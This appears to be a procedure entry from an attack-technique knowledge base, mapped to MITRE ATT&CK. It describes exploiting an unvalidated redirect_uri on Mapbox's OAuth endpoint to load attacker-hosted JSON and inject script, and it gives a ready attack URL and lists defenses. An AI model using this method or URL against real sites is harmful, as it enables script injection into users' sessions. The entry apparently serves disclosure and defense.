---
id: proc-trigger-xss-redirect
tags:
  - open-redirect
  - xss-trigger
type: procedure
tools:
  - '[[tools/Chrome]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:09.179Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Trigger-XSS-via-Malicious-Redirect-URI

## Summary

This procedure exploits the open redirect in Mapbox's /core/oauth/auth endpoint by supplying a redirect_uri pointing to the malicious JSON, causing the authorize page to fetch and insert the unescaped payload, resulting in XSS execution.

## Description

The vulnerability stems from lack of validation on the redirect_uri parameter in /core/oauth/auth, allowing arbitrary URLs. When the www.mapbox.com/authorize/ page loads with this parameter, it fetches from the auth endpoint, receives the JSON from the attacker's server, and inserts obj.authorize_url into the form action without escaping. The payload closes the attribute and injects <script>, executing JS in the context of www.mapbox.com.

## Requirements

1. Malicious JSON hosted and CORS configured from previous procedures.
2. Public access to https://www.mapbox.com/authorize/.
3. A web browser for testing.

## Defense

Defensive measures and detection strategies:

- Enforce strict redirect_uri validation against a whitelist of trusted URIs.
- Sanitize and escape all dynamic content in templates (e.g., use <%= escape(obj.authorize_url) %>).
- Implement rate limiting on auth endpoints to prevent abuse.
- Log all redirect attempts and flag external domains.

## Objectives

1. Redirect the auth flow to fetch attacker-controlled content.
2. Inject and execute JavaScript via template injection.
3. Gain code execution on the target domain.

## Instructions

### Step 1: Construct the Malicious URL

**Context**: Append the redirect_uri parameter to the authorize endpoint, pointing to the hosted JSON.

Build the URL: https://www.mapbox.com/authorize/?redirect_uri=https://u00f1.xyz/mapbox/oauth.json

> Replace with your actual JSON URL. This triggers the fetch on page load.

### Step 2: Load the URL in Browser

**Context**: Navigate to the URL to initiate the OAuth flow and observe the injection.

Open in [[tools/Chrome]] or similar: https://www.mapbox.com/authorize/?redirect_uri=https://u00f1.xyz/mapbox/oauth.json

> Monitor the Network tab for the fetch to /core/oauth/auth and then to the JSON URL. The form action should show the injected script.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Chrome]]

## Tags

- open-redirect
- xss
- oauth
